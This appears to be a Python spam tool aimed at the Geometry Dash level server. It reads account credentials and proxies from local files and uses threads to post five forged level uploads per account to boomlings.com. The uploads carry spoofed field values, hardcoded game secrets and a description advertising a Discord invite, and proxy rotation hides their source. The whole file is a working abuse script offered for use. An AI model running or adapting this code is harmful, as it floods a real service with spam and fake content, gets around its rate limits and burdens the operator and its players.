from requests import post
from threading import Thread
from random import choices
from hashlib import sha1
from time import sleep
from base64 import urlsafe_b64encode
from uuid import uuid4

possibleletters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890"
threadslist = []

def getproxies() :

    try :
            
        with open("proxies.txt", "r") as proxies :

            return [line.strip() for line in proxies]
        
    except FileNotFoundError :

        print("Proxy file 'proxies.txt' not found!")

        return False

def getaccounts() :

    try :
            
        with open("accounts.txt", "r") as accountsfile :

            return [line.strip() for line in accountsfile]
        
    except FileNotFoundError :

        print("Proxy file 'accounts.txt' not found!")

        return False

def spamlevel(account,proxy) :

    username, password, accountID, playerID = account.split(",")

    proxies = {
        "http" : proxy,
        "https" : proxy
    }

    for _ in range(5) :

        data = {
            "accountID": accountID,
            "audioTrack": 0,
            "auto": 0,
            "binaryVersion": 45,
            "coins": 127,
            "gameVersion": 22,
            "gjp2": sha1((password+"mI29fmAnxgTs").encode()).hexdigest(),
            "ldm": 1,
            "levelDesc": urlsafe_b64encode(b"RigMatter12 was here ;) Join https://discord.gg/FZm4HuVcaW").decode(),
            "levelID": 0,
            "levelInfo": "",
            "levelLength": 5,
            "levelName": f"RM12 {"".join(choices("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890",k=10))}",
            "levelString": "H4sIAAAAAAAACq2ZXW8bNxBF_9C64JDDLwR5cIEmDdC4rZO4QF8WrQ3Yge3GD6nTBP3xJXckOynMwwbug5aSLnnFPXd2B5IuX4WyyOpW3x6hPURWH-Mq3oawDboeyJpWcc6teZVVYj-UNr2s8vdXLJfHLa-PW-7XvvIhC-0e4uNqS9invX68hz7o0efYgv9i4uLwhL7SKE2M5nj9_7GNh6Asl4cSFteHaEOyQZd2tOd5O_qdbq-k9OFVqKZtR_PZhENdpB1NFWeTbJa3aV5tyNtEdTaIDX4bvFl5cwmmBdOCbU3NTM1Moy03LQSbaVsJtv1gn9cvyz7UbZDdWdg6v9uu2Obb8ESW9rF-OWiMmmn7lNg_qe1BmiRJ7kX9l1gbSL-ETcum9ZfLm-urP17_8sydPT_5-PL1i_Mz_-zTi-cXV6fXb85__Hj59G6puPDFWulUvmmvOpY2Nq_fruvN728P3__09tt3Z98ffzj99O72B398c-qPbk-vf_7zV396e3x18_7ouws5uT66OPnwtPuHqqUbRv1s42FJy0F73s7e3-8huS-mdHE7iUv318vzzay_k7t2IM6maZ_Wq26nimM5sJxYrih7z3JkuaBs4Y5lZZmpKVNLbJ7YPLN55kgyR5I5ksKRFI6kcCSVI6lMrc4KeVLJblLKblLLjsmJMDoRZifC8MQzPfGMT_yEX5jdCSb8woSPTvjohI9O-MQJnzjhEzj_xPaRdxf55CKzUUarvHPl4CZY-G6yqRlby0gNqCZUK6m7tjJSI6qF1F1PGamKKrJSZJXQOaFzRueMKWRMIWMKBVMomELBFCqmUJFVnVQsl6zjmnVctA557fvHUEZi--4xkj0y2_eOoczUwuRCZ2qBsShjUcaijCUylshYAuad0DvixiKeVUQkijwV96wYFdPAW8UmKvaJkRpQTahWUnd9YqRGVAupuz4xUhVVZKXIKqFzQueMzhlTyJhCxhQKplAwhYIpVEyhIqs6qVguWcc167hoHfLa94mhjMT2fWIke2S27xNDmamFyYXO1AJjUcaijEUZS2QskbEEzDuhd8SNRTyriEgUeSruWTEqpoG3Cvu2gX1ipAZUE6qV1P3PVNgnRmohdf8bFfaJkYqsFFkldE7onNE5YwoZU8iYQsEUCqZQMIWKKVRkVScVyyXruGYdF61DXne_R3GfGMqI7O7HKO4TQ5mphcmFztQCY1HGooxFGUtkLJGxBMw7oXfEjUU8q4hIFHkq7lkxKqYxFGvQe5i7Lxzt7f6_Uv97Zwm1wfLtTqTtNtjf0L64Hb39ReP68OQfV_WalAUeAAA=",
            "levelVersion": -128,
            "objects": 1000000,
            "original": 666,
            "password": 0,
            "requestedStars": 127,
            "secret": "Wmfd2893gb7",
            "seed": "".join(choices("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890",k=10)),
            "seed2": "AwYFAlZVCFBUAgFUAAAHB1QAAw0AAAQHUFUFUwFVDAUEBFANAgBRVw==",
            "songID": -666,
            "songIDs": 627354,
            "ts": 666,
            "twoPlayer": 1,
            "udid": str(uuid4()).upper(),
            "unlisted": 0,
            "userName": username,
            "uuid": playerID,
            "wt": 2397600,
            "wt2": 2397600000}

        try :

            print(post(url="https://www.boomlings.com/database/uploadGJLevel21.php",data=data,headers={"User-Agent":"","Cookie":"gd=1;"},proxies=proxies).text)

        except Exception as Error :

            print(f"There was an Error : {Error}")

        sleep(0.5)

if __name__ == "__main__" :

    try :

        while True :

            command = input("Press '0' to exit or '1' to start : ")

            if command == "0" :

                break

            elif command == "1" :

                accounts = getaccounts()
                proxies = getproxies()

                for account,proxy in zip(accounts,proxies) :

                    thread = Thread(target=spamlevel,args=(account,proxy))
                    threadslist.append(thread)

                for thread in threadslist :

                    thread.start()
                    sleep(0.01)

                for thread in threadslist :

                    thread.join()

                threadslist.clear()

            else :

                print("Invalid action!")
    
    except Exception as Error :

        print(f"there was an Error : {Error}")